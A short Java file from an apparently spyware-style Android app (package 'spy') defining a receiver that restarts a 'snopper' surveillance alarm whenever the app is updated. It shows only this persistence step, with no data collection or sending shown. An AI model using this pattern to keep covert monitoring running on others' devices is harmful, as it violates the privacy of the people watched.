package com.gameofcoding.spy.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.gameofcoding.spy.spys.SnopperStarter;
import com.gameofcoding.spy.utils.XLog;

public class AppUpdatedReceiver extends BroadcastReceiver {
    private static final String TAG = "AppUpdateReceiver";
    @Override
    public void onReceive(Context context, Intent intent) {
	XLog.i(TAG, "App updated, restarting snopper alarm");
	new SnopperStarter(context).start();
    }
}
